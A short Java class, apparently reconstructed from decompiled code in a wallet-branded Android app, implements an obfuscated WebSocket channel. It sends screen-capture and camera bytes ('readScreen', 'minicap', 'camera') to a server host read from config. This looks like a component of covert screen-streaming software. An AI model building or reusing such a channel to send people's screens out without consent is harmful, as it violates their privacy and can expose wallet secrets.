package com.guard.wallet.bridge;

import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.websocket.VendorWebSocketClient;

import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * WebSocket bridge 通道 — vendor bridge.a.
 * Extends {@link VendorWebSocketClient} (replacing the old {@code f1.a} stub).
 * Manages a single WebSocket channel (readScreen / minicap / camera / cacheTask).
 */
public class a extends VendorWebSocketClient {

    /** WSS endpoint built from device config. */
    public static final String y = "wss://".concat(com.guard.wallet.utils.ConfigManager.getServerHost()).concat("/bridge");

    /** Channel path (e.g. "/readScreen", "/minicap"). */
    public String u;

    /** Connection state flag. */
    public final AtomicBoolean w = new AtomicBoolean(false);

    public a(String path, BridgeMessage message) {
        super(URI.create(y));
        this.u = path;
    }

    // ---- Lifecycle overrides ----

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        super.onOpen(handshakedata);
        w.set(true);
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        w.set(false);
    }

    /** Vendor {@code u()} -> start connection. Sets state and calls connect(). */
    @Override
    public void u() {
        w.set(true);
        super.u();
    }

    /** Vendor {@code t()} -> close connection. Resets state and calls close(). */
    @Override
    public void t() {
        w.set(false);
        super.t();
    }

    /** Vendor {@code B(byte[])} -> send binary data (screen capture bytes). */
    public void B(byte[] data) {
        if (data != null && data.length > 0 && w.get()) {
            send(data);
        }
    }
}
